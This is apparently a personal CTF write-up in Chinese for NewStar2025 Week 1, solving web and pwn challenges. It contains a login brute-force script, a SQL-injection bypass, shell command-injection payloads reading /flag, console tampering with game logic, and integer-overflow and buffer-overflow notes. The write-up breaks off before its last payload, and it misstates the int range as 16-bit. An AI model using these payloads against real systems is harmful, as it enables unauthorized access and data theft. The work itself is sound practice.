# [个人] NewStar2025下旬的WriteUp

1、公开赛道比赛时间：9 月 29 日 9:00 - 11 月 2 日 18:00

2、Week 3 题目得分截止时间为 10 月 26 日 18:00，逾期提交答题仅可验证答案正误，不予计分。

3、Week 1 与 Week 2 采用静态积分模式，每道题目固定分值为 100 分；Week 3 至 Week 5 采用动态积分模式，每道题目初始分值 500 分，衰减后最低分值为 50 分，若分数相同，将依据答题时间长短排序，时间较短者优先。

4、公开榜单线上地址：https://match.ichunqiu.com/rankings/2025newstargk

5、10 月 27 日 9:00 将开放 Week 5 题目

6、请各位选手一周提交一次wp，wp内容为：完整一周的解题过程。

7、week3 Reverse中的谁改了我的密钥啊-Revenge，得分延长至24日18:00



# Week1

## Web

### multi-headach3

#### 解题过程

看到源码

```html
<h1>Hello!</h1>
<p>Today is 2025/10/06</p>

welcome to my first website!<br>
<br>
<b>ROBOTS</b>
is protecting this website!<br>
But... Why my head is so <b>painful</b>
???!!!<br>
And why you are here again and again?<br>
Trust me, hidden page is not as simple as you think.<br>
```

注意到ROBOTS，联想到反爬虫中的反制机器人配置文件robots.txt

拼接网址：*/robots.txt

看到内容

```html
User-agent: *
Disallow: /hidden.php
```

拼接网址：*/hidden.php

发现会自动跳转到*/index.php

使用BP工具抓包

接收到响应：flag{29e11c69-5205-4b76-976d-d4770951f310}



### strange_login

#### 解题过程

注意到源码

```html
<!DOCTYPE html>
<html>
<head>
    <title>Strange Login</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            min-width: 350px;
        }
        .title {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 20px;
            font-style: italic;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #667eea;
            color: white;
            padding: 14px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #5a67d8;
        }
        .error {
            color: red;
            text-align: center;
            margin: 10px 0;
        }
        .hint {
            color: #888;
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2 class="title">Strange Login</h2>
        <p class="subtitle">"我当然知道1=1了！？"</p>
        
                
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="用户名" required>
            <input type="password" name="password" placeholder="密码" required>
            <input type="submit" value="登录">
        </form>
        
        <div class="hint">
            提示：尝试以管理员身份登录查看特殊内容
        </div>
    </div>
</body>
</html>

```

看到提示"尝试以管理员身份登录查看特殊内容"，想到admin弱口令爆破

写python爆破脚本

```python
# 1. 导入需要的库：requests用于发送网络请求
import requests

# 2. 基础配置（根据题目信息填写，零基础只需确认这些参数）
TARGET_URL = "https://eci-2zeg4m5lpz5o56i8pac4.cloudeci1.ichunqiu.com:80/login.php"  # 登录接口地址
ADMIN_USER = "admin"  # 目标用户名（题目提示“管理员身份”，默认用admin）
PASSWORD_FILE = "password.txt"  # 本地字典文件路径（如果文件和脚本在同一文件夹，直接写文件名即可）

# 3. 读取本地密码字典
try:
    # 打开password.txt文件（encoding="utf-8"避免中文乱码，errors="ignore"忽略特殊字符错误）
    with open(PASSWORD_FILE, "r", encoding="utf-8", errors="ignore") as f:
        # 读取所有行，并存入列表（每行一个密码）
        password_list = f.readlines()
    print(f"✅ 成功读取字典文件，共包含 {len(password_list)} 个密码")

except FileNotFoundError:
    # 如果文件找不到，提示用户检查路径
    print(f"❌ 错误：没找到 {PASSWORD_FILE} 文件，请确认文件路径是否正确！")
    exit()  # 退出脚本

# 4. 循环尝试破解（核心步骤）
print("🔍 开始尝试破解（按Ctrl+C可停止）...\n")
for index, password in enumerate(password_list, start=1):
    # 去掉密码前后的空白字符（比如换行符、空格，避免密码错误）
    clean_password = password.strip()

    # 跳过空行（如果字典里有空行，不尝试）
    if not clean_password:
        continue

    # 5. 构造登录请求参数（模拟浏览器提交的表单数据）
    login_data = {
        "username": ADMIN_USER,  # 用户名（固定为admin）
        "password": clean_password  # 当前要尝试的密码
    }

    try:
        # 6. 发送POST请求（模拟点击“登录”按钮）
        # allow_redirects=True：允许跟随302重定向（题目中失败会跳转到error页面）
        response = requests.post(
            url=TARGET_URL,
            data=login_data,
            allow_redirects=True,
            timeout=10  # 超时时间10秒（避免网络卡顿时脚本卡住）
        )

        # 7. 判断登录是否成功（根据题目响应规律）
        # 失败特征：重定向到包含“error=1”的页面；成功则不会有这个参数
        if "error=1" not in response.url:
            print(f"\n🎉 破解成功！")
            print(f"用户名：{ADMIN_USER}")
            print(f"密码：{clean_password}")
            break  # 找到密码后停止循环

        # 8. 打印当前尝试进度（方便查看状态）
        print(f"尝试进度：{index}/{len(password_list)} | 当前密码：{clean_password} → 失败")

    # 处理网络异常（比如断网、目标地址无法访问）
    except requests.exceptions.RequestException as e:
        print(f"❌ 网络错误：{str(e)} | 跳过当前密码：{clean_password}")
        continue

# 9. 如果循环结束都没找到密码
else:
    print(f"\n❌ 破解完成：遍历完所有密码，未找到正确密码（可能字典不全或用户名错误）")
```

得到结果

```python
🎉 破解成功！
用户名：admin
密码：claire (这里我发现每个容器的密码都是随机的)
```

进入到界面，看到源码

```html
Query failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''asdfghjkl;''' at line 1
```

很明显题目提示我们要用一个更聪明的方法来登录admin即

从True：SELECT * FROM ADMIN WHERE USERNAME='admin' AND PASSWORD='claire'

到True：SELECT * FROM ADMIN WHERE USERNAME='admin' AND PASSWORD='1' or '1='1'

返回登录解码输入

账号：admin

密码：1' or '1'='1

得出：**flag{14368b3e-9704-4273-82e1-c012d45cb197}**



### 宇宙的中心是php

#### 解题过程

根据题目提示访问网址：http://39.106.48.123:43273/

查看源码发现

```html
<!-- 你还是找到了......这片黑暗的秘密 -->
<!-- s3kret.php -->
```

拼接网址`s3kret.php`看到题目

```php
<?php
highlight_file(__FILE__);
include "flag.php";
if(isset($_POST['newstar2025'])){
    $answer = $_POST['newstar2025'];
    if(intval($answer)!=47&&intval($answer,0)==47){
        echo $flag;
    }else{
        echo "你还未参透奥秘";
    }
}
```

**分析：**

我们要POST一个newstar2025参数，而且它的值10进制不等于47，但是其他进制为47

我们取它的值为16进制0x2f

构造并发送payload

```cmd
curl -X POST -d "newstar2025=0x2f" http://39.106.48.123:43273/s3kret.php
# flag{c03f9448-d1f8-4a03-b69a-b8f6e620c083}
```

得到：flag{c03f9448-d1f8-4a03-b69a-b8f6e620c083}



### 别笑，你也过不了第二关

#### 解题过程

直接查看源码

```js
<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>帮助哪吒接魔丸</title>
  <style>
    body {
      text-align: center;
      font-family: Arial;
      background: #f0f0f0;
    }
    #game {
      margin: 20px auto;
      width: 400px;
      height: 600px;
      background: white;
      border: 2px solid #333;
      position: relative;
      overflow: hidden;
    }
    #player {
      width: 60px;
      height: 60px;
      position: absolute;
      bottom: 20px;
      left: 180px;
      border-radius: 5px;
      z-index: 10;
      overflow: hidden;
    }
    #player img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      border-radius: 5px;
    }
    .gate {
      width: 80px;
      height: 120px;
      position: absolute;
      top: 0;
      border-radius: 10px;
      background-size: cover;
      background-position: center;
    }
    #score, #level {
      font-size: 20px;
      margin: 10px;
    }
    .finish-line {
      position: absolute;
      width: 100%;
      height: 5px;
      background: red;
      top: 0;
    }
  </style>
</head>
<body>
  <h1>帮助哪吒接魔丸</h1>
  <p id="level">关卡: 1</p>
  <p id="score">分数: 0</p>
  <div id="game">
    <div id="player">
      <img src="3.jpg" alt="player">
    </div>
  </div>
  <script>
    const game = document.getElementById("game");
    const player = document.getElementById("player");
    const scoreEl = document.getElementById("score");
    const levelEl = document.getElementById("level");

    let score = 0;
    let steps = 0;
    let maxSteps = 10; // 每关掉落数量
    let targetScores = [30, 1000000]; // 每关目标分数
    let currentLevel = 0; // 0 表示第一关
    let gameEnded = false;
    let finishSpawned = false;
    let playerX = 180;
    let gateInterval = null;

    document.addEventListener("keydown", (e) => {
      if (e.key === "ArrowLeft") movePlayer(-100);
      if (e.key === "ArrowRight") movePlayer(100);
    });

    function movePlayer(offset) {
      let newX = playerX + offset;
      if (newX < 0 || newX > 340) return;
      playerX = newX;
      player.style.left = playerX + "px";
    }

    function spawnGate() {
      if (steps >= maxSteps || gameEnded || finishSpawned) return;
      steps++;
      const gate = document.createElement("div");
      gate.className = "gate";

      let x = Math.random() < 0.5 ? 60 : 260;
      gate.style.left = x + "px";

      let isAdd = Math.random() < 0.5;
      if (isAdd) {
        gate.dataset.value = 10;
        gate.style.backgroundImage = "url('2.jpg')";
      } else {
        gate.dataset.value = -10;
        gate.style.backgroundImage = "url('1.jpg')";
      }

      game.appendChild(gate);

      let y = 0;
      const fall = setInterval(() => {
        y += 5;
        gate.style.top = y + "px";

        const playerRect = player.getBoundingClientRect();
        const gateRect = gate.getBoundingClientRect();

        if (!(playerRect.right < gateRect.left ||
              playerRect.left > gateRect.right ||
              playerRect.bottom < gateRect.top ||
              playerRect.top > gateRect.bottom)) {
          score += parseInt(gate.dataset.value);
          scoreEl.innerText = "分数: " + score;
          clearInterval(fall);
          gate.remove();

          if (steps >= maxSteps && !finishSpawned) spawnFinishLine();
        }

        if (y > 600) {
          clearInterval(fall);
          gate.remove();
          if (steps >= maxSteps && !finishSpawned) spawnFinishLine();
        }
      }, 50);
    }

    function spawnFinishLine() {
      finishSpawned = true;
      const finish = document.createElement("div");
      finish.className = "finish-line";
      finish.style.left = "0px";
      game.appendChild(finish);

      let y = 0;
      const fall = setInterval(() => {
        y += 5;
        finish.style.top = y + "px";

        const playerRect = player.getBoundingClientRect();
        const finishRect = finish.getBoundingClientRect();

        if (!(playerRect.right < finishRect.left ||
              playerRect.left > finishRect.right ||
              playerRect.bottom < finishRect.top ||
              playerRect.top > finishRect.bottom)) {
          clearInterval(fall);
          finish.remove();
          endLevel();
        }

        if (y > 600) {
          clearInterval(fall);
          finish.remove();
          endLevel();
        }
      }, 50);
    }

    function endLevel() {
  if (gameEnded) return;

  clearInterval(gateInterval);
  gateInterval = null;

  if (score >= targetScores[currentLevel]) {
    alert(`恭喜通过第 ${currentLevel + 1} 关！得分: ${score}`);
    currentLevel++;
    if (currentLevel < targetScores.length) {
      // 下一关
      resetLevel(currentLevel);
      startGame();
    } else {
      // 全部通关
      gameEnded = true;
      const formData = new URLSearchParams();
formData.append("score", score);

      fetch("/flag.php", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: formData.toString()
})
.then(res => res.text())
.then(data => {
  alert("服务器返回:\n" + data);
})
.catch(err => {
  alert("请求失败: " + err);
});
    }
  } else {
    alert(`第 ${currentLevel + 1} 关未达成目标分数 (目标: ${targetScores[currentLevel]})，将重新开始本关！`);
    resetLevel(currentLevel);
    startGame();
  }
}


    function resetLevel(levelIndex) {
      score = 0;
      scoreEl.innerText = "分数: " + score;
      steps = 0;
      finishSpawned = false;
      levelEl.innerText = "关卡: " + (levelIndex + 1);
      [...game.querySelectorAll('.gate, .finish-line')].forEach(e => e.remove());
    }

    function startGame() {
      gateInterval = setInterval(spawnGate, 1500);
    }
    startGame();
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) {
        if (gateInterval) {
          clearInterval(gateInterval);
          gateInterval = null;
        }
      } else {
        if (!gameEnded && !gateInterval) {
          gateInterval = setInterval(spawnGate, 1500);
        }
      }
    });
  </script>
</body>
</html>
```

我们简单化简一下源码

```js
let score = 0;
let currentLevel = 0; // 0 表示第一关

if (score >= targetScores[currentLevel]) {
    alert(`恭喜通过第 ${currentLevel + 1} 关！得分: ${score}`);
}

function endLevel() {
  if (gameEnded) return;
}
```

**分析：**`score`是我们的分数，`currentLevel`是我们的关数，`endLevel()`是停止函数

我们在console中构造并发送payload

```js
let score = 114514;
let currentLevel = 1;
endLevel();
```

在响应中找到

```
恭喜newstar，这是你的flag flag{1dd3e628-0f57-45b4-bd3a-d8c98a72c719}
```

得到：flag{1dd3e628-0f57-45b4-bd3a-d8c98a72c719}



### DD加速器

#### 解题过程

查看源码

```php
<?php
$presetServers = [
    'cn' => '127.0.0.1',
    'na' => '127.0.0.1',
    'eu' => '127.0.0.1',
];
$result = '';
$selectedRegion = isset($_POST['region']) ? $_POST['region'] : 'cn';
$target = isset($_POST['target']) ? trim($_POST['target']) : ($presetServers[$selectedRegion] ?? '127.0.0.1');
$maxLen = 28;
if (isset($_POST['target'])) {
    $target = substr($target, 0, $maxLen);
    if ($target !== $_POST['target']) {
        $result = "目标地址长度超过限制";
        
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && $result === '') {
    $host = $target;
    if ($host === '') {
        $result = "请输入目标地址";
    } else {
        $boost = isset($_POST['boost']) && $_POST['boost'] === 'on';
        $packetSize = $boost ? 1400 : 56;

        $cmd = "ping -c 1 -W 1 -s " . intval($packetSize) . " " . $host . " 2>&1";
        $result = shell_exec($cmd);
        if ($result === null) {
            $result = "执行失败";
        }
    }
}
?>
```

化简源码

```php
$cmd = "ping -c 1 -W 1 -s " . intval($packetSize) . " " . $host . " 2>&1";
$result = shell_exec($cmd);
```

**分析：**发现存在ping类型的cmd指令注入漏洞

**尝试1：**

构造并发送payload

```cmd
127.0.0.1;ls /

# PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
# 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms

# --- 127.0.0.1 ping statistics ---
# 1 packets transmitted, 1 received, 0% packet loss, time 0ms
# rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
# bin
# boot
# dev
# etc
# flag
# home
# lib
# lib64
# media
# mnt
# opt
# proc
# root
# run
# sbin
# srv
# sys
# tmp
# usr
# var
```

**分析：**发现根目录下存在`/flag`

构造并发送payload

```cmd
127.0.0.1;cat /flag

# PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
# 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms

# --- 127.0.0.1 ping statistics ---
# 1 packets transmitted, 1 received, 0% packet loss, time 0ms
# rtt min/avg/max/mdev = 0.025/0.025/0.025/0.000 ms
# flag{not_here!}
```

发现根目录下的`/flag`是假的flag

**尝试2：**

使用find指令搜索含有flag字符的文件(区分大小写)

```cmd
127.0.0.1;find / -iname "flag*"
# 目标地址长度超过限制
```

注意到它的长度限制是`28`个字符

直接扫描全部文件

```cmd
127.0.0.1;find /
```

并利用Ctrl+F搜索flag找到

```cmd
/.7iqyqt757mmlc6jl62rhl2sgifqzo7vi
/.7iqyqt757mmlc6jl62rhl2sgifqzo7vi/flag
/flag
```

利用linux操作系统的通配符避免长度过长的问题，构造并发送payload获取flag

```cmd
127.0.0.1;cat /.7*/flag
# PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
# 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms

# --- 127.0.0.1 ping statistics ---
# 1 packets transmitted, 1 received, 0% packet loss, time 0ms
# rtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms
# flag{42eb3b81-128c-4ad4-a9cd-53070ccd7942}
```

得到：flag{42eb3b81-128c-4ad4-a9cd-53070ccd7942}



### 搞点哦润吉吃吃橘

#### 解题过程

看到源码中的提示

```js
<!-- 唔...这个密码有点难记，但是我已经记好了 Doro/Doro_nJlPVs_@123 -->
```

得到`用户名Doro`和`密码Doro_nJlPVs_@123`

登录后看到源码

```js
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>保险系统令牌验证</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            color: white;
            font-size: 1.5rem;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 1rem;
        }
        
        .user-info span {
            color: white;
            font-weight: 500;
        }
        
        .logout-btn {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 0.5rem 1rem;
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s ease;
        }
        
        .logout-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .main-content {
            padding: 3rem 2rem;
            text-align: center;
        }
        
        .welcome-card {
            background: white;
            padding: 3rem;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        
        .welcome-card h2 {
            color: #333;
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }
        
        .welcome-card p {
            color: #666;
            font-size: 1.1rem;
            line-height: 1.6;
        }
        
        .flash-messages {
            margin: 1rem 2rem;
        }
        
        .flash-message {
            padding: 0.75rem;
            border-radius: 5px;
            margin-bottom: 0.5rem;
        }
        
        .flash-message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .flash-message.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .flash-message.info {
            background-color: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        .challenge-section {
            margin-top: 2rem;
            text-align: left;
        }
        
        .challenge-info {
            background: #f8f9fa;
            padding: 1.5rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
        }
        
        .challenge-info h3 {
            color: #333;
            margin-bottom: 1rem;
        }
        
        .challenge-info p {
            margin-bottom: 0.5rem;
            color: #555;
        }
        
        .challenge-info code {
            background: #e9ecef;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        
        .challenge-controls {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        
        .challenge-btn {
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .start-btn {
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white;
        }
        
        .start-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(40, 167, 69, 0.3);
        }
        

        
        .submit-btn {
            background: linear-gradient(135deg, #007bff, #6610f2);
            color: white;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3);
        }
        
        .expression-display {
            background: #e7f3ff;
            padding: 1.5rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            border-left: 4px solid #007bff;
        }
        
        .expression-display h4 {
            color: #333;
            margin-bottom: 0.5rem;
        }
        
        .expression-display code {
            background: #fff;
            padding: 0.75rem;
            border-radius: 5px;
            display: block;
            font-family: 'Courier New', monospace;
            font-size: 1.1rem;
            color: #d63384;
            border: 1px solid #dee2e6;
        }
        
        .timer-display {
            margin-top: 1rem;
            font-weight: bold;
            color: #dc3545;
        }
        
        .token-input-section {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        
        .token-input {
            flex: 1;
            padding: 0.75rem;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 1rem;
            font-family: 'Courier New', monospace;
        }
        
        .token-input:focus {
            outline: none;
            border-color: #007bff;
        }
        
        .result-display {
            padding: 1rem;
            border-radius: 5px;
            margin-top: 1rem;
            min-height: 50px;
        }
        
        .result-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .result-error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .flag-display {
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            color: #333;
            font-weight: bold;
            font-size: 1.2rem;
            text-align: center;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
            border: 2px solid #ffc107;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>验证页面</h1>
        <div class="user-info">
            <span>Doro</span>
            <a href="/logout" class="logout-btn">退出登录</a>
        </div>
    </div>
    
    <div class="flash-messages">
        
            
        
    </div>
    
    <div class="main-content">
        <div class="welcome-card">
            <img src="/static/doro.ico" alt="Doro">
            <p>算个token就能吃橘子</p>
            
            <div class="challenge-section">
                <div class="challenge-info">
                    <h3>Doro的一些提示</h3>
                    <p>1. 点击"开始验证"获取验证表达式</p>
                    <p>2. 使用表达式计算token值并在3秒内提交</p>
                    <p>3. 表达式格式：<code>token = (int(time.time()) * multiplier) ^ xor_value</code></p>
                    <p>emmm... doro觉得抓包看看也许会发现这个系统的逻辑</p>
                </div>
                
                <div class="challenge-controls">
                    <button id="startBtn" class="challenge-btn start-btn">开始验证</button>
                </div>
                
                <div id="expressionDisplay" class="expression-display" style="display: none;">
                    <h4>当前验证表达式：</h4>
                    <code id="expressionText"></code>
                    <div class="timer-display">
                        <span>剩余时间：<span id="countdown">3</span>秒</span>
                    </div>
                </div>
                
                <div class="token-input-section">
                    <input type="number" id="tokenInput" placeholder="请输入计算出的token值" class="token-input">
                    <button id="submitBtn" class="challenge-btn submit-btn">提交验证</button>
                </div>
                
                <div id="resultDisplay" class="result-display"></div>
            </div>
        </div>
    </div>

    <script>
        let countdownTimer = null;
        let challengeActive = false;

        const startBtn = document.getElementById('startBtn');
        const submitBtn = document.getElementById('submitBtn');
        const expressionDisplay = document.getElementById('expressionDisplay');
        const expressionText = document.getElementById('expressionText');
        const tokenInput = document.getElementById('tokenInput');
        const resultDisplay = document.getElementById('resultDisplay');
        const countdownElement = document.getElementById('countdown');

        async function startChallenge() {
            try {
                const response = await fetch('/start_challenge', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                });
                
                const data = await response.json();
                
                if (data.error) {
                    showResult(data.error, 'error');
                    return;
                }
                
                expressionText.textContent = data.expression;
                expressionDisplay.style.display = 'block';
                
                tokenInput.value = '';
                resultDisplay.innerHTML = '';
                resultDisplay.className = 'result-display';
                
                challengeActive = true;
                startCountdown();
                
                showResult('挑战已开始！请在3秒内完成验证。', 'success');
                
            } catch (error) {
                showResult('启动挑战失败：' + error.message, 'error');
            }
        }

        function startCountdown() {
            let timeLeft = 3;
            countdownElement.textContent = timeLeft;
            
            countdownTimer = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownTimer);
                    challengeActive = false;
                    showResult('时间到！挑战失败，请重新开始。', 'error');
                    expressionDisplay.style.display = 'none';
                }
            }, 1000);
        }

        async function submitToken() {
            if (!challengeActive) {
                showResult('请先开始挑战！', 'error');
                return;
            }
            
            const token = tokenInput.value.trim();
            if (!token) {
                showResult('请输入token值！', 'error');
                return;
            }
            
            clearInterval(countdownTimer);
            challengeActive = false;
            expressionDisplay.style.display = 'none';
            
            try {
                const response = await fetch('/verify_token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ token: parseInt(token) })
                });
                
                const data = await response.json();
                
                if (data.error) {
                    showResult(data.error, 'error');
                    return;
                }
                
                if (data.success) {
                    showResult(`${data.message} (用时: ${data.elapsed_time}秒)`, 'success');
                    showFlag(data.flag);
                } else {
                    showResult(`${data.message} (用时: ${data.elapsed_time}秒)`, 'error');
                }
                
            } catch (error) {
                showResult('提交失败：' + error.message, 'error');
            }
        }

        function showResult(message, type) {
            resultDisplay.innerHTML = message;
            resultDisplay.className = `result-display result-${type}`;
        }

        function showFlag(flag) {
            const flagDiv = document.createElement('div');
            flagDiv.className = 'flag-display';
            flagDiv.innerHTML = `🎉 恭喜获得Flag：<br><code>${flag}</code>`;
            resultDisplay.appendChild(flagDiv);
        }

        startBtn.addEventListener('click', startChallenge);
        submitBtn.addEventListener('click', submitToken);
        
        tokenInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitToken();
            }
        });
    </script>
</body>
</html>
```

提取主要内容化简

```js
                const response = await fetch('/start_challenge', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                });
                
                const data = await response.json();

                const response = await fetch('/verify_token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ token: parseInt(token) })
                });
                
                const data = await response.json();

                if (data.success) {
                    showResult(`${data.message} (用时: ${data.elapsed_time}秒)`, 'success');
                    showFlag(data.flag);
                }
```

先来获取一下路由`/start_challenge`的数据看看先

~~~js
                const response = await fetch('/start_challenge', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                });
                
                const data = await response.json();
console.log(data);

```
VM153:9 
{expression: 'token = (1761477994 * 69717) ^ 0x4543cd', hint: 'doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们......', multiplier: 69717, xor_value: '0x4543cd'}
expression
: 
"token = (1761477994 * 69717) ^ 0x4543cd"
hint
: 
"doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们......"
multiplier
: 
69717
xor_value
: 
"0x4543cd"
[[Prototype]]
: 
Object
```
~~~

**分析：**看到关键信息`token = (1761477994 * 69717) ^ 0x4543cd`我看可以通过这个路由计算出token然后发送到`/verify_token`路由来获得flag响应即`data.flag`

**尝试1：**

构造并发送payload

```js
const response = await fetch('/start_challenge',{method:'POST',headers:{'Content-Type':'application/json'}});
const data = await response.json();
const time = data.expression.split('(')[1].split(' ')[0];
const multiplier = data.multiplier;
const xor_value = data.xor_value;
const token = (time*multiplier)^xor_value;
const verifyRes=await fetch('/verify_token',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({token: parseInt(token)})
});
const flag = await verifyRes.json();
console.log(time);
console.log(time*multiplier)
console.log((time*multiplier)^xor_value)
console.log(flag.success);

# 1761478253
# VM176:14 77654768783505
# VM176:15 1747206716
# VM176:16 false
```

发现失败了，查了一下原因大概是javascript和后端python的精度不一样过，python的精度高，而js把精度丢失了

**尝试2：**

利用BigInt封装数据

```js
const response = await fetch('/start_challenge',{method:'POST',headers:{'Content-Type':'application/json'}});
const data = await response.json();
const time = BigInt(data.expression.split('(')[1].split(' ')[0]);
const multiplier = BigInt(data.multiplier);
const xor_value = BigInt(data.xor_value);
const token = (time*multiplier)^xor_value;
const verifyRes=await fetch('/verify_token',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({token: parseInt(token)})
});
const flag = await verifyRes.json();
console.log(flag.flag);

# flag{947364d0-28f2-48c4-8fd9-9542f784f742}
```

得到：flag{947364d0-28f2-48c4-8fd9-9542f784f742}



## pwn

### INTbug

#### 解题过程

看到化简后的源码

```c
while (true) {
    int v1 = 0;
    int v2 = 0;
	__isoc99_scanf("%1d", &v2);

	if ( ++v1 < 0 ) {
   	   puts("You got it!\n");
   	   system("cat flag");
	}
}
```

**分析：**

当v1小于0时就能获得flag，v1初始化是0然后每次输入都会自增1

让我们先回顾一下int的范围是(-2\*\*15 , 2\*\*15-1)即(-32,768 , 32,767)

只要我们输入32768次数字就可以获得flag了

值得一提的是

```c
alarm(0x64u);
```

题目是有100秒的时间限制的

所以我们不可能用手动输入，可以利用python来主动输入

```cmd
python -c "print('1\n'*32768)" | nc 39.106.48.123 27711
# welcome to NewStarCTF2025!

# You got it!

# flag{ed3bd80c-80da-44ae-b729-e189a5987f18}
```

得到：flag{ed3bd80c-80da-44ae-b729-e189a5987f18}



### INTbug (复现)

#### 解题过程

```python
from pwn import *

r = remote("127.0.0.1", 3904)

r.recvuntil(b"welcome to NewStarCTF2025!\n")
for i in range(32767+1):
    r.sendline(b'1')
    
r.interactive()
```

**得到：flag{ed3bd80c-80da-44ae-b729-e189a5987f18}**



### pwn's door

#### 解题过程

这是一道签到题，看到化简后的代码

```c
__isoc99_scanf("%d", &v4);
  if ( v4 == 7038329 )
  {
    puts("You have successfully opened the door!");
    puts("please try the command 'cat flag' to get the flag.");
    system("/bin/sh");
  }
```

**分析：**

当我们在交互中输入`7038329`即可获得`shell`来`ls`和`cat /flag`

具体操作如下

```cmd
C:\Users\probie>nc 8.147.132.32 22975
You have successfully seen the door with the help of cat or python!
And you find that you need a key to open the door.
Take a try
1 2 3
4 5 6
7 8 9
  0
password: 7038329
You have successfully opened the door!
please try the command 'cat flag' to get the flag.
ls
door
entry.sh
flag
cat flag
flag{cab7e4f6-941c-44b0-8c00-1c695894738a}
```

得到：flag{cab7e4f6-941c-44b0-8c00-1c695894738a}



### overflow

#### 解题过程

养成一个好习惯先查看程序信息

```shell
file overflow
overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f02ecb0d4879c4d3e15ea13746724cf6647e2c9c, for GNU/Linux 3.2.0, with debug_info, not stripped
```

然后在IDA中查看部分简化代码

```c
char buffer[256];
gets(buffer);
```

**分析：**该程序存在缓冲区大小为`256`，gets中rbp基值寄存器的大小为`8`

构造并发送payload.py

